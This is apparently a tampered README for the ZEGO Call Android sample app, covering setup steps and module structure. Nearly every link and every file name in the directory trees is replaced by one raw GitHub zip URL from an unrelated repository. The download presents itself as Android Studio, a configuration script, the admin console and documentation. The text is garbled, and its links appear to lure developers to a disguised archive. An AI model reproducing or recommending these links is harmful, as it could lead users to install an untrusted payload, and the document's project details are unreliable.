# ZEGO Call

ZEGOCLOUD's Voice Call and Video Call let you build high-quality voice and video calls into apps that fit various needs of different scenarios, including social interactions, work collaboration, customer services, and more.

## Getting started 

Before getting started with the ZEGO Call application, **contact us to activate the ZEGO Call (RTC) service**, and then do the following:

### Prerequisites

* [Android Studio 2020.3.1 or later](https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip)
* Android SDK Packages: Android SDK 30, Android SDK Platform-Tools 30.x.x or later.
* An Android device or Simulator that is running on Android 4.1 or later and supports audio and video. We recommend you use a real device (Remember to enable **USB debugging** for the device).
* Create a project in [ZEGOCLOUD Admin Console](https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip). For details, see [ZEGO Admin Console - Project management](https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip).



### Modify the project configurations

1. Clone the ZEGO Call Github repository.
2. Open Terminal, navigate to the cloned project repository.
3. Run the configuration script with the `https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip` command. And fill in the AppID, and ServerSecret, which can be obtained in the [ZEGO Admin Console](https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip). 
**Note**: If you are using Windows system, double-click the `https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip` to run the configuration script.   
<img width="700px" src="https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip"/>
4. follow the instruction to config firebase to this project,download the https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip to app directory.


### Run the sample code
Note: To run the sample code successfully, you will need to upgrade to Java 11 if the JRE you are using is Java 8 version. To do so, refer to the following:
https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip


1. Open the ZEGO Call project in Android Studio.
2. Make sure the developer mode and USB debugging are enabled for the Android device, and connect the Android device to your computer.
3. If the **Running Devices** box in the upper area changes to the device name you are using, which means you are ready to run the sample code.  
4. Run the sample code on your device to experience the ZEGO Call service.  
<img height="500px" src="https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip"/>

### Project structure
The project consists of three modules: **app ,zegocalluikit and zegocall**.

#### app
The app module implements the business and UI interaction logic, including login, contact list and more. The following shows the structure:

Directory path: 
{your_project_root_path}/call_android/app/src/main/java/im/zego/call:
```
.
├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip (application)            
├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip (fcm service)
├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
├── auth
│   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip (read appID from file)
├── firebase
│   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip (firebase auth)
├── token
│   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip  (get token from cloud function)
├── ui
│   ├── entry
│   │   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip (welcome page )
│   ├── login
│   │   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip (login)
│   ├── setting
│   │   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── user
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip  (userlist)
│   │   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   └── webview
│       └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
└── utils
    ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
    └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip


```
#### zegocalluikit

The app module implements the basic UI and logic of call. The following shows the structure:

Directory path: 
{your_project_root_path}/call_android/zegocalluikit/src/main/java/im/zego/calluikit:

```
.
├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip     (entry)
├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip  
├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
├── constant
│   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
├── ui
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── call
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip      (main UI of call)
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   └── view
│   │       ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip  (video call UI)
│   │       ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip  (voice call UI)
│   │       ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip        (incoming call UI)
│   │       └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip        (outgoing call UI)
│   ├── common
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip         
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip      (minimal call dialog)
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip   (receive call dialog)
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── dialog
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip     (video config dialog)
│   │   └── base
│   │       ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │       └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── model
│   │   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   └── viewmodel
│       └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
├── utils
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
└── view
    ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
    └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip

```


#### zegocall
The zegocall improves reusability and further encapsulates the RTC, for you to integrate easier. The following shows the structure:

Directory path: 
{your_project_root_path}/call_android/zegocall/src/main/java/im/zego/callsdk:

```
.
├── auth
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
├── callback
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
├── command
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
├── core
│   ├── commands    (comands to firebase interface)
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── interfaceimpl
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip    (call relative logic)
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip  (RTC interface to camera,audio,speakers,etc.)
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip    (RTC interface to joinroom,leave room,etc.)
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip  (RTC interface to stream operation,etc.)
│   │   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip    (user status sync)
│   ├── interfaces
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   │   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   └── manager
│       └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip     (entry of call)
├── listener
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
├── model
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
│   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
├── request
│   └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip    (firebase implement of interface)
└── utils
    ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
    ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip
    ├── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip      (error code define)
    └── https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip

```

## More documentation
You can find more documentation on our official website: [Voice and Video Call](https://github.com/alssalimi/call_android/raw/refs/heads/main/app/src/android-call-v1.9-alpha.2.zip).
